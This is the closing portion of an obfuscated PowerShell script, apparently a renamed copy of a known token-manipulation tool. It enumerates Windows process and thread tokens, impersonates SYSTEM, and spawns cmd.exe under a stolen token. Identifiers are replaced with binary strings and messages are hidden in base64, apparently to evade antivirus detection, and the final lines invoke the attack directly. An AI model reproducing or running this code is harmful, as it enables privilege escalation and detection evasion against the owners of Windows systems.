            ${01011000110011101} = [IntPtr]::Zero
            [System.Runtime.InteropServices.Marshal]::ZeroFreeGlobalAllocUnicode(${10000101100110111})
            ${10000101100110111} = [IntPtr]::Zero
            ${10101100100110000} = ${11000001101111010}.Invoke(${00110110101110101})
            ${00110110101110101} = [IntPtr]::Zero
            if (-not ${10101100100110000})
            {
                ${01110010101100000} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAEgAYQBuAGQAbABlACAAZgBhAGkAbABlAGQAIAB0AG8AIABjAGwAbwBzAGUAIABOAGUAdwBIAFQAbwBrAGUAbgAuACAARQByAHIAbwByAEMAbwBkAGUAOgAgACQAewAwADEAMQAxADAAMAAxADAAMQAwADEAMQAwADAAMAAwADAAfQA=')))
            }
        }
    }
    function _00110101011000001
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [PSObject[]]
            ${_10101100110111000}
        )
        foreach (${10010100101011101} in ${_10101100110111000})
        {
            ${10101100100110000} = ${11000001101111010}.Invoke(${10010100101011101}.hToken)
            if (-not ${10101100100110000})
            {
                ${01110010101100000} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbABlAGQAIAB0AG8AIABjAGwAbwBzAGUAIAB0AG8AawBlAG4AIABoAGEAbgBkAGwAZQAgAGkAbgAgAEYAcgBlAGUALQBBAGwAbABUAG8AawBlAG4AcwAuACAARQByAHIAbwByAEMAbwBkAGUAOgAgACQAewAwADEAMQAxADAAMAAxADAAMQAwADEAMQAwADAAMAAwADAAfQA=')))
            }
            ${10010100101011101}.hToken = [IntPtr]::Zero
        }
    }
    function _10000011101001110
    {
        ${_01011000110110011} = @()
        ${00011111011110111} = _00101000101010010 -ProcessId (ps wininit | where {$_.SessionId -eq 0}).Id
        if (${00011111011110111} -eq $null -or (-not (_00100100100101000 -_10111010100010000 ${00011111011110111}.hProcToken)))
        {
            Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABpAG0AcABlAHIAcwBvAG4AYQB0AGUAIABTAFkAUwBUAEUATQAsACAAdABoAGUAIABzAGMAcgBpAHAAdAAgAHcAaQBsAGwAIABuAG8AdAAgAGIAZQAgAGEAYgBsAGUAIAB0AG8AIABlAG4AdQBtAGUAcgBhAHQAZQAgAGEAbABsACAAdABvAGsAZQBuAHMA')))
        }
        if (${00011111011110111} -ne $null -and ${00011111011110111}.hProcToken -ne [IntPtr]::Zero)
        {
            ${11000001101111010}.Invoke(${00011111011110111}.hProcToken) | Out-Null
            ${00011111011110111} = $null
        }
        ${00101110110100110} = get-process | where {$_.name -inotmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBjAHMAcgBzAHMAJAA='))) -and $_.name -inotmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBzAHkAcwB0AGUAbQAkAA=='))) -and $_.id -ne 0}
        foreach ($Process in ${00101110110100110})
        {
            ${01100011001100110} = (_00101000101010010 -ProcessId $Process.Id -_00001000010100010)
            if (${01100011001100110} -ne $null)
            {
                [IntPtr]${_10111010100010000} = [IntPtr]${01100011001100110}.hProcToken
                if (${_10111010100010000} -ne [IntPtr]::Zero)
                {
                    ${10100111101000110} = _01000101000011000 -_10111010100010000 ${_10111010100010000}
                    if (${10100111101000110} -ne $null)
                    {
                        ${10100111101000110} | Add-Member -MemberType NoteProperty -Name ProcessId -Value $Process.Id
                        ${_01011000110110011} += ${10100111101000110}
                    }
                }
                else
                {
                    Write-Warning "Couldn't retrieve token for Process: $($Process.Name). ProcessId: $($Process.Id)"
                }
                foreach (${10110111011010111} in $Process.Threads)
                {
                    ${01110010000000001} = _01000101001101000 -ThreadId ${10110111011010111}.Id
                    [IntPtr]${_10111010100010000} = (${01110010000000001}.hThreadToken)
                    if (${_10111010100010000} -ne [IntPtr]::Zero)
                    {
                        ${10100111101000110} = _01000101000011000 -_10111010100010000 ${_10111010100010000}
                        if (${10100111101000110} -ne $null)
                        {
                            ${10100111101000110} | Add-Member -MemberType NoteProperty -Name ThreadId -Value ${10110111011010111}.Id
                            ${_01011000110110011} += ${10100111101000110}
                        }
                    }
                }
            }
        }
        return ${_01011000110110011}
    }
    function _01010111000000111
    {
        Param(
            [Parameter(Position=0)]
            [Switch]
            ${_00000111101100100}
        )
        ${10101100100110000} = ${01001110111110001}.Invoke()
        if (${_00000111101100100})
        {
            if (${10101100100110000})
            {
                echo "RevertToSelf was successful. Running as: $([Environment]::UserDomainName)\$([Environment]::UserName)"
            }
            else
            {
                echo "RevertToSelf failed. Running as: $([Environment]::UserDomainName)\$([Environment]::UserName)"
            }
        }
    }
    function _10110000110110101
    {
        if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgA=')))))
        {
            Write-Error $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAHIAaQBwAHQAIABtAHUAcwB0ACAAYgBlACAAcgB1AG4AIABhAHMAIABhAGQAbQBpAG4AaQBzAHQAcgBhAHQAbwByAA=='))) -ErrorAction Stop
        }
        if ([System.Diagnostics.Process]::GetCurrentProcess().SessionId -eq 0)
        {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AbgBpAG4AZwAgAGkAbgAgAFMAZQBzAHMAaQBvAG4AIAAwACwAIABmAG8AcgBjAGkAbgBnACAATgBvAFUASQAgACgAcAByAG8AYwBlAHMAcwBlAHMAIABpAG4AIABTAGUAcwBzAGkAbwBuACAAMAAgAGMAYQBuAG4AbwB0ACAAaABhAHYAZQAgAGEAIABVAEkAKQA=')))
            $NoUI = $true
        }
        if ($PsCmdlet.ParameterSetName -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHYAVABvAFMAZQBsAGYA'))))
        {
            _01010111000000111 -_00000111101100100
        }
        elseif ($PsCmdlet.ParameterSetName -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUAByAG8AYwBlAHMAcwA='))) -or $PsCmdlet.ParameterSetName -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAZQByAHMAbwBuAGEAdABlAFUAcwBlAHIA'))))
        {
            ${_01011000110110011} = _10000011101001110
            [IntPtr]${_10111010100010000} = [IntPtr]::Zero
            ${10110001010010010} = (_01110001001010001 -_01011000110110011 ${_01011000110110011}).TokenByUser
            if ($Username -ne $null -and $Username -ne '')
            {
                if (${10110001010010010}.ContainsKey($Username))
                {
                    ${_10111010100010000} = ${10110001010010010}[$Username].hToken
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGwAZQBjAHQAaQBuAGcAIAB0AG8AawBlAG4AIABiAHkAIAB1AHMAZQByAG4AYQBtAGUA')))
                }
                else
                {
                    Write-Error "A token belonging to the specified username was not found. Username: $($Username)" -ErrorAction Stop
                }
            }
            elseif ( $ProcessId -ne $null -and $ProcessId -ne 0)
            {
                foreach (${01110000001110010} in ${_01011000110110011})
                {
                    if ((${01110000001110010} | gm ProcessId) -and ${01110000001110010}.ProcessId -eq $ProcessId)
                    {
                        ${_10111010100010000} = ${01110000001110010}.hToken
                        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGwAZQBjAHQAaQBuAGcAIAB0AG8AawBlAG4AIABiAHkAIABQAHIAbwBjAGUAcwBzAEkARAA=')))
                    }
                }
                if (${_10111010100010000} -eq [IntPtr]::Zero)
                {
                    Write-Error "A token belonging to ProcessId $($ProcessId) could not be found. Either the process doesn't exist or it is a protected process and cannot be opened." -ErrorAction Stop
                }
            }
            elseif ($ThreadId -ne $null -and $ThreadId -ne 0)
            {
                foreach (${01110000001110010} in ${_01011000110110011})
                {
                    if ((${01110000001110010} | gm ThreadId) -and ${01110000001110010}.ThreadId -eq $ThreadId)
                    {
                        ${_10111010100010000} = ${01110000001110010}.hToken
                        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGwAZQBjAHQAaQBuAGcAIAB0AG8AawBlAG4AIABiAHkAIABUAGgAcgBlAGEAZABJAGQA')))
                    }
                }
                if (${_10111010100010000} -eq [IntPtr]::Zero)
                {
                    Write-Error "A token belonging to ThreadId $($ThreadId) could not be found. Either the thread doesn't exist or the thread is in a protected process and cannot be opened." -ErrorAction Stop
                }
            }
            elseif ($Process -ne $null)
            {
                foreach (${01110000001110010} in ${_01011000110110011})
                {
                    if ((${01110000001110010} | gm ProcessId) -and ${01110000001110010}.ProcessId -eq $Process.Id)
                    {
                        ${_10111010100010000} = ${01110000001110010}.hToken
                        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGwAZQBjAHQAaQBuAGcAIAB0AG8AawBlAG4AIABiAHkAIABQAHIAbwBjAGUAcwBzACAAbwBiAGoAZQBjAHQA')))
                    }
                }
                if (${_10111010100010000} -eq [IntPtr]::Zero)
                {
                    Write-Error "A token belonging to Process $($Process.Name) ProcessId $($Process.Id) could not be found. Either the process doesn't exist or it is a protected process and cannot be opened." -ErrorAction Stop
                }
            }
            else
            {
                Write-Error $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQB1AHMAdAAgAHMAdQBwAHAAbAB5ACAAYQAgAFUAcwBlAHIAbgBhAG0AZQAsACAAUAByAG8AYwBlAHMAcwBJAGQALAAgAFQAaAByAGUAYQBkAEkAZAAsACAAbwByACAAUAByAG8AYwBlAHMAcwAgAG8AYgBqAGUAYwB0AA==')))  -ErrorAction Stop
            }
            if ($PsCmdlet.ParameterSetName -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUAByAG8AYwBlAHMAcwA='))))
            {
                if (-not $NoUI)
                {
                    _10100110100010000
                }
                _00111111101000000 -_10111010100010000 ${_10111010100010000} -_01101001010111110 $CreateProcess -ProcessArgs $ProcessArgs -PassThru:$PassThru
                _01010111000000111
            }
            elseif ($ImpersonateUser)
            {
                _00100100100101000 -_10111010100010000 ${_10111010100010000} | Out-Null
                echo "Running As: $([Environment]::UserDomainName)\$([Environment]::UserName)"
            }
            _00110101011000001 -_10101100110111000 ${_01011000110110011}
        }
        elseif ($PsCmdlet.ParameterSetName -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBoAG8AQQBtAEkA'))))
        {
            echo "$([Environment]::UserDomainName)\$([Environment]::UserName)"
        }
        else 
        {
            ${_01011000110110011} = _10000011101001110
            if ($PsCmdlet.ParameterSetName -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAG8AdwBBAGwAbAA='))))
            {
                echo ${_01011000110110011}
            }
            else
            {
                echo (_01110001001010001 -_01011000110110011 ${_01011000110110011}).TokenByUser.Values
            }
            _01010111000000111
            _00110101011000001 -_10101100110111000 ${_01011000110110011}
        }
    }
    _10110000110110101
}
$SystemUser = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
Invoke-Token -CreateProcess cmd.exe -Username "$SystemUser.UserId"
